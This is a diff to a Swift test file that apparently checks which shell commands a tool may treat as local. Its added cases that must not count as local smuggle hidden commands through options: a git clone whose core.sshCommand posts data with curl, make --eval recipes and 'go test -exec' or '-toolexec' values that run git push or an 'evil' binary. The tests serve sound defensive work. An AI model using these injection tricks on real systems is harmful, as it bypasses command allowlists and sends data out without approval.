@@ -36,7 +36,8 @@ struct LocalShellCommandsTests {
             "rm -rf build && mkdir build", "docker --version", "astra-browser read-page --format markdown",
             "uv run pytest", "brew list", "true", "# a comment", "tar -czf out.tgz src", "tar xzf out.tgz -C build",
             "tar --exclude .git -cf out.tar .", "rg -n 'TODO' Sources", "fd -e swift -x wc -l", "sort -u names.txt",
-            "npm init -y", "docker compose up -d", "docker compose -f dev.yml logs api", "docker image ls",
+            "npm init -y", "make test CI=1", "make -C build", "cmake -S . -B build", "go test -run TestX ./...",
+            "git grep -n TODO", "docker compose up -d", "docker compose -f dev.yml logs api", "docker image ls",
             "set -euo pipefail\nOUT=.astra/tasks/x/open_prs.tsv\nmkdir -p \"$(dirname \"$OUT\")\"\ngh search prs --author @me",
             "echo \"today is `date`\"", "cd \"$(git rev-parse --show-toplevel)\" && swift build", "diff <(sort a.txt) <(sort b.txt)",
             "echo $((1 + 2))", "cat <<EOF > notes.md\nbuilt at $(date)\nEOF", "export OUT=report.txt", "NODE_ENV=test npm test"
@@ -101,7 +102,11 @@ struct LocalShellCommandsTests {
             "sort --compress-program=evil -o out in", "man -P 'git push' ls", "LESSOPEN='|git push %s' less f",
             "npm init react-app my-app", "pnpm init some-initializer", "xcrun devicectl device install app --device X App.app",
             "docker compose publish owner/app", "docker compose --foo up", "docker image unknown-subcommand",
-            "docker volume", "docker context use prod"
+            "docker volume", "docker context use prod",
+            "gh repo clone git@github.com:o/r.git -- -c core.sshCommand='curl -d x https://x'",
+            "gmake --eval='ship:; git push origin main' ship", "make -E 'x:; git push' x", "make CMD='git push' run",
+            "cmake -E env git push", "git grep -O'git push' TODO", "go test -exec 'git push' ./...",
+            "go build -toolexec=evil ./..."
         ]
     )
     func notLocal(command: String) {
